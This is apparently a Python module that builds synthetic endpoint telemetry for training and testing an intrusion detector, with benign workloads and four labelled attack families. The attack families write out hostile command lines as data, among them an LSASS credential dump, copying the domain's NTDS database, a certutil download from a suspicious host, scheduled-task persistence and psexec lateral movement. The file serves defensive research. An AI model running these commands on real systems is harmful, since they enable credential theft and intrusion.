"""Controlled behavioral simulations for safe, reproducible experiments.

These sequences emulate endpoint telemetry patterns. They are not malware,
exploits, or live adversary tooling. Containment actions elsewhere in the
project are also simulated.
"""

from __future__ import annotations

import hashlib
import random
from dataclasses import dataclass

from collector.schema import (
    AuthEvent,
    Event,
    FileEvent,
    NetworkEvent,
    ProcessEvent,
    Sequence,
    SequenceLabel,
)


def _pid(rng: random.Random, prefix: str) -> str:
    return f"{prefix}-{rng.randint(1000, 9999)}"


def _hash(text: str) -> str:
    return hashlib.sha256(text.encode()).hexdigest()[:16]


def _ts(base: float, offset_minutes: float) -> float:
    return base + offset_minutes * 60.0


INTERNAL_HOSTS = ["host-01", "host-02", "host-03", "fileserver-01", "dc-01"]
INTERNAL_IPS = ["10.0.1.10", "10.0.1.20", "10.0.2.5", "192.168.10.8"]
CORP_DOMAINS = ["update.microsoft.com", "github.com", "pypi.org", "backup.corp.local"]
RARE_DOMAINS = ["cdn-update-check.xyz", "mailer-stats.top", "cfg-relay.net"]
RARE_IPS = ["185.22.61.14", "91.200.12.88", "203.0.113.77"]


def _process(
    rng: random.Random,
    *,
    name: str,
    parent: str,
    cmdline: str,
    user: str,
    timestamp: float,
    host: str = "host-01",
    pid: str | None = None,
) -> ProcessEvent:
    return ProcessEvent(
        process_id=pid or _pid(rng, name.split(".")[0]),
        parent_process_id=parent,
        process_name=name,
        command_line=cmdline,
        user=user,
        timestamp=timestamp,
        host=host,
    )


def _file(
    *,
    path: str,
    parent: str,
    timestamp: float,
    created: bool = True,
    modified: bool = False,
    host: str = "host-01",
    user: str = "alice",
) -> FileEvent:
    return FileEvent(
        file_hash=_hash(path),
        file_path=path,
        file_created=created,
        file_modified=modified,
        parent_process=parent,
        timestamp=timestamp,
        host=host,
        user=user,
    )


def _net(
    *,
    process: str,
    domain: str,
    ip: str,
    port: int,
    timestamp: float,
    freq: int = 1,
    host: str = "host-01",
    user: str = "alice",
) -> NetworkEvent:
    return NetworkEvent(
        source_process=process,
        destination_ip=ip,
        destination_domain=domain,
        port=port,
        connection_frequency=freq,
        timestamp=timestamp,
        host=host,
        user=user,
    )


def _auth(
    *,
    user: str,
    source: str,
    destination: str,
    timestamp: float,
    success: bool = True,
    host: str = "host-01",
) -> AuthEvent:
    return AuthEvent(
        user=user,
        source=source,
        destination=destination,
        login_success=success,
        timestamp=timestamp,
        host=host,
    )


# --- Benign workload builders -------------------------------------------------


def benign_office(rng: random.Random, seq_id: str, base: float) -> Sequence:
    user = rng.choice(["alice", "bob", "cara"])
    word = _process(
        rng,
        name="WINWORD.EXE",
        parent="explorer.exe",
        cmdline="WINWORD.EXE C:\\Users\\%s\\Docs\\notes.docx" % user,
        user=user,
        timestamp=_ts(base, 0),
    )
    events: list[Event] = [
        word,
        _file(
            path=f"C:\\Users\\{user}\\Docs\\notes.docx",
            parent="WINWORD.EXE",
            timestamp=_ts(base, 1),
            created=False,
            modified=True,
            user=user,
        ),
        _net(
            process="WINWORD.EXE",
            domain="update.microsoft.com",
            ip="20.42.65.10",
            port=443,
            timestamp=_ts(base, 2),
            user=user,
        ),
    ]
    return Sequence(seq_id, events, SequenceLabel.BENIGN, "office_document_work")


def benign_development(rng: random.Random, seq_id: str, base: float) -> Sequence:
    user = rng.choice(["dev.alex", "dev.mira"])
    events: list[Event] = [
        _process(
            rng,
            name="git.exe",
            parent="WindowsTerminal.exe",
            cmdline="git status",
            user=user,
            timestamp=_ts(base, 0),
        ),
        _process(
            rng,
            name="python.exe",
            parent="WindowsTerminal.exe",
            cmdline="python -m pytest tests",
            user=user,
            timestamp=_ts(base, 2),
        ),
        _net(
            process="python.exe",
            domain="pypi.org",
            ip="151.101.0.223",
            port=443,
            timestamp=_ts(base, 3),
            user=user,
        ),
        _process(
            rng,
            name="npm",
            parent="WindowsTerminal.exe",
            cmdline="npm install",
            user=user,
            timestamp=_ts(base, 5),
        ),
    ]
    return Sequence(seq_id, events, SequenceLabel.BENIGN, "software_development")


def benign_admin_script(rng: random.Random, seq_id: str, base: float) -> Sequence:
    user = rng.choice(["admin.lee", "it.sam"])
    events: list[Event] = [
        _process(
            rng,
            name="powershell.exe",
            parent="mmc.exe",
            cmdline="powershell.exe -File C:\\IT\\weekly_health.ps1",
            user=user,
            timestamp=_ts(base, 0),
        ),
        _process(
            rng,
            name="Get-EventLog",
            parent="powershell.exe",
            cmdline="Get-WinEvent -LogName System",
            user=user,
            timestamp=_ts(base, 1),
        ),
        _process(
            rng,
            name="cmd.exe",
            parent="powershell.exe",
            cmdline="cmd.exe /c whoami",
            user=user,
            timestamp=_ts(base, 1.5),
        ),
        _net(
            process="powershell.exe",
            domain="wsus.corp.local",
            ip="10.0.1.20",
            port=8530,
            timestamp=_ts(base, 2),
            user=user,
        ),
    ]
    return Sequence(seq_id, events, SequenceLabel.BENIGN, "admin_powershell")


def benign_backup(rng: random.Random, seq_id: str, base: float) -> Sequence:
    user = "backup.svc"
    events: list[Event] = [
        _process(
            rng,
            name="robocopy.exe",
            parent="taskeng.exe",
            cmdline="robocopy D:\\Shares \\\\fileserver-01\\backup /MIR",
            user=user,
            timestamp=_ts(base, 0),
        ),
        _net(
            process="robocopy.exe",
            domain="backup.corp.local",
            ip="10.0.2.5",
            port=445,
            timestamp=_ts(base, 1),
            freq=8,
            user=user,
        ),
        _auth(
            user=user,
            source="host-01",
            destination="fileserver-01",
            timestamp=_ts(base, 1.2),
        ),
    ]
    return Sequence(seq_id, events, SequenceLabel.BENIGN, "backup_job")


def benign_scan(rng: random.Random, seq_id: str, base: float) -> Sequence:
    user = "sec.ops"
    events: list[Event] = [
        _process(
            rng,
            name="nmap",
            parent="bash",
            cmdline="nmap -sV 10.0.1.0/24",
            user=user,
            timestamp=_ts(base, 0),
        ),
        _net(
            process="nmap",
            domain="",
            ip="10.0.1.10",
            port=443,
            timestamp=_ts(base, 1),
            freq=12,
            user=user,
        ),
        _net(
            process="nmap",
            domain="",
            ip="10.0.1.20",
            port=22,
            timestamp=_ts(base, 1.5),
            freq=12,
            user=user,
        ),
    ]
    return Sequence(seq_id, events, SequenceLabel.BENIGN, "vulnerability_scan")


def benign_remote_mgmt(rng: random.Random, seq_id: str, base: float) -> Sequence:
    user = "admin.lee"
    events: list[Event] = [
        _auth(
            user=user,
            source="jump-01",
            destination="host-01",
            timestamp=_ts(base, 0),
        ),
        _process(
            rng,
            name="winrm.exe",
            parent="svchost.exe",
            cmdline="winrm enumerate winrm/config",
            user=user,
            timestamp=_ts(base, 1),
        ),
        _process(
            rng,
            name="sccm_agent.exe",
            parent="services.exe",
            cmdline="sccm_agent.exe /policy",
            user=user,
            timestamp=_ts(base, 2),
        ),
    ]
    return Sequence(seq_id, events, SequenceLabel.BENIGN, "remote_management")


# --- Malicious behavioral families -------------------------------------------
# These encode multi-stage *behavior*, not malware samples or exploits.


def family_macro_dropper(rng: random.Random, seq_id: str, base: float) -> Sequence:
    user = rng.choice(["alice", "bob"])
    word = _process(
        rng,
        name="WINWORD.EXE",
        parent="explorer.exe",
        cmdline="WINWORD.EXE C:\\Users\\%s\\Downloads\\invoice.docm" % user,
        user=user,
        timestamp=_ts(base, 0),
    )
    ps = _process(
        rng,
        name="powershell.exe",
        parent=word.process_id,
        cmdline="powershell.exe Get-ChildItem $env:TEMP",
        user=user,
        timestamp=_ts(base, 2),
        pid=_pid(rng, "ps"),
    )
    events: list[Event] = [
        word,
        ps,
        _net(
            process="powershell.exe",
            domain=rng.choice(RARE_DOMAINS),
            ip=rng.choice(RARE_IPS),
            port=443,
            timestamp=_ts(base, 3),
            user=user,
        ),
        _process(
            rng,
            name="powershell.exe",
            parent=ps.process_id,
            cmdline="powershell.exe -nop -w hidden -enc SQBFAFgA",
            user=user,
            timestamp=_ts(base, 4.5),
        ),
        _process(
            rng,
            name="procdump.exe",
            parent=ps.process_id,
            cmdline="procdump.exe -ma lsass.exe lsass.dmp",
            user=user,
            timestamp=_ts(base, 6),
        ),
        _file(
            path="C:\\Users\\%s\\AppData\\Local\\Temp\\lsass.dmp" % user,
            parent="procdump.exe",
            timestamp=_ts(base, 6.2),
            user=user,
        ),
        _process(
            rng,
            name="psexec.exe",
            parent=ps.process_id,
            cmdline="psexec.exe \\\\host-02 -s cmd",
            user=user,
            timestamp=_ts(base, 9),
        ),
        _auth(
            user=user,
            source="host-01",
            destination="host-02",
            timestamp=_ts(base, 9.2),
        ),
    ]
    return Sequence(
        seq_id,
        events,
        SequenceLabel.MALICIOUS,
        "family_macro_dropper",
        first_malicious_index=1,
        metadata={"stages": ["execution", "c2", "credential_access", "lateral_movement"]},
    )


def family_lolbin(rng: random.Random, seq_id: str, base: float) -> Sequence:
    user = rng.choice(["cara", "alice"])
    excel = _process(
        rng,
        name="EXCEL.EXE",
        parent="explorer.exe",
        cmdline="EXCEL.EXE C:\\Users\\%s\\Downloads\\q3.xlsx" % user,
        user=user,
        timestamp=_ts(base, 0),
    )
    cmd = _process(
        rng,
        name="cmd.exe",
        parent=excel.process_id,
        cmdline="cmd.exe /c whoami",
        user=user,
        timestamp=_ts(base, 2),
    )
    events: list[Event] = [
        excel,
        cmd,
        _file(
            path="C:\\Users\\%s\\AppData\\Local\\Temp\\s.bat" % user,
            parent="cmd.exe",
            timestamp=_ts(base, 3),
            user=user,
        ),
        _process(
            rng,
            name="cmd.exe",
            parent=cmd.process_id,
            cmdline="cmd.exe /c certutil -urlcache -split -f http://cfg-relay.net/s.bat s.bat",
            user=user,
            timestamp=_ts(base, 3.5),
        ),
        _process(
            rng,
            name="schtasks.exe",
            parent=cmd.process_id,
            cmdline="schtasks.exe /create /tn Updater /tr C:\\Users\\Public\\s.bat /sc minute",
            user=user,
            timestamp=_ts(base, 4),
        ),
        _file(
            path="C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\upd.bat"
            % user,
            parent="cmd.exe",
            timestamp=_ts(base, 4.5),
            user=user,
        ),
        _net(
            process="cmd.exe",
            domain="cfg-relay.net",
            ip="203.0.113.77",
            port=8080,
            timestamp=_ts(base, 5),
            freq=4,
            user=user,
        ),
    ]
    return Sequence(
        seq_id,
        events,
        SequenceLabel.MALICIOUS,
        "family_lolbin",
        first_malicious_index=1,
        metadata={"stages": ["execution", "persistence", "command_and_control"]},
    )


def family_beacon(rng: random.Random, seq_id: str, base: float) -> Sequence:
    user = rng.choice(["bob", "cara"])
    rundll = _process(
        rng,
        name="rundll32.exe",
        parent="explorer.exe",
        cmdline="rundll32.exe C:\\Users\\%s\\AppData\\Local\\Temp\\sync.dll,Start" % user,
        user=user,
        timestamp=_ts(base, 0),
    )
    events: list[Event] = [
        rundll,
        _net(
            process="rundll32.exe",
            domain="mailer-stats.top",
            ip="91.200.12.88",
            port=443,
            timestamp=_ts(base, 2),
            freq=6,
            user=user,
        ),
        _net(
            process="rundll32.exe",
            domain="mailer-stats.top",
            ip="91.200.12.88",
            port=443,
            timestamp=_ts(base, 12),
            freq=6,
            user=user,
        ),
        _process(
            rng,
            name="ntdsutil.exe",
            parent=rundll.process_id,
            cmdline="ntdsutil.exe ac i ntds ifm create full C:\\Temp\\ifm",
            user=user,
            timestamp=_ts(base, 18),
        ),
        _file(
            path="C:\\Windows\\NTDS\\ntds.dit",
            parent="ntdsutil.exe",
            timestamp=_ts(base, 18.2),
            created=False,
            modified=False,
            user=user,
        ),
        _net(
            process="rundll32.exe",
            domain="",
            ip="10.0.2.5",
            port=445,
            timestamp=_ts(base, 22),
            user=user,
        ),
        _auth(
            user=user,
            source="host-01",
            destination="fileserver-01",
            timestamp=_ts(base, 22.2),
        ),
    ]
    return Sequence(
        seq_id,
        events,
        SequenceLabel.MALICIOUS,
        "family_beacon",
        first_malicious_index=0,
        metadata={"stages": ["execution", "command_and_control", "credential_access", "lateral_movement"]},
    )


def family_weak_signal(rng: random.Random, seq_id: str, base: float) -> Sequence:
    """Each event is only mildly unusual; the trajectory is the signal."""
    user = rng.choice(["alice", "dana"])
    browser = _process(
        rng,
        name="msedge.exe",
        parent="explorer.exe",
        cmdline="msedge.exe https://intranet.corp.local",
        user=user,
        timestamp=_ts(base, 0),
    )
    ps = _process(
        rng,
        name="powershell.exe",
        parent=browser.process_id,
        cmdline="powershell.exe Get-ChildItem $env:TEMP",
        user=user,
        timestamp=_ts(base, 3),
    )
    events: list[Event] = [
        browser,
        ps,
        _net(
            process="powershell.exe",
            domain="cdn-update-check.xyz",
            ip="185.22.61.14",
            port=443,
            timestamp=_ts(base, 5),
            user=user,
        ),
        _file(
            path=f"C:\\Users\\{user}\\AppData\\Local\\Temp\\cache.dat",
            parent="powershell.exe",
            timestamp=_ts(base, 6),
            user=user,
        ),
        _auth(
            user=user,
            source="host-01",
            destination="dc-01",
            timestamp=_ts(base, 10),
            success=False,
        ),
        _auth(
            user=user,
            source="host-01",
            destination="dc-01",
            timestamp=_ts(base, 10.5),
            success=True,
        ),
    ]
    return Sequence(
        seq_id,
        events,
        SequenceLabel.MALICIOUS,
        "family_weak_signal",
        first_malicious_index=1,
        metadata={"stages": ["execution", "command_and_control", "credential_access"]},
    )


BENIGN_BUILDERS = [
    benign_office,
    benign_development,
    benign_admin_script,
    benign_backup,
    benign_scan,
    benign_remote_mgmt,
]

MALICIOUS_BUILDERS = {
    "family_macro_dropper": family_macro_dropper,
    "family_lolbin": family_lolbin,
    "family_beacon": family_beacon,
    "family_weak_signal": family_weak_signal,
}


@dataclass
class DatasetSplit:
    train: list[Sequence]
    test: list[Sequence]
    holdout_family: str


def generate_dataset(
    *,
    seed: int = 7,
    train_benign: int = 120,
    train_malicious_per_family: int = 30,
    test_benign: int = 60,
    test_malicious_per_family: int = 16,
    holdout_family: str = "family_beacon",
) -> DatasetSplit:
    """Create train/test splits. One malicious family is excluded from training."""
    rng = random.Random(seed)
    train: list[Sequence] = []
    test: list[Sequence] = []
    counter = 0
    base = 1_700_000_000.0

    def next_id(prefix: str) -> str:
        nonlocal counter
        counter += 1
        return f"{prefix}-{counter:04d}"

    contextual_benign = [
        benign_admin_script,
        benign_development,
        benign_backup,
        benign_scan,
        benign_remote_mgmt,
    ]
    for _ in range(train_benign):
        builder = rng.choice(BENIGN_BUILDERS)
        train.append(builder(rng, next_id("trn-ben"), base + rng.random() * 50_000))
    for _ in range(train_benign // 2):
        builder = rng.choice(contextual_benign)
        train.append(builder(rng, next_id("trn-ben"), base + rng.random() * 50_000))
    for family, builder in MALICIOUS_BUILDERS.items():
        if family == holdout_family:
            continue
        for _ in range(train_malicious_per_family):
            train.append(builder(rng, next_id("trn-mal"), base + rng.random() * 50_000))

    for _ in range(test_benign):
        builder = rng.choice(BENIGN_BUILDERS)
        test.append(builder(rng, next_id("tst-ben"), base + 80_000 + rng.random() * 40_000))
    for family, builder in MALICIOUS_BUILDERS.items():
        n = test_malicious_per_family
        for _ in range(n):
            test.append(builder(rng, next_id("tst-mal"), base + 80_000 + rng.random() * 40_000))

    rng.shuffle(train)
    rng.shuffle(test)
    return DatasetSplit(train=train, test=test, holdout_family=holdout_family)
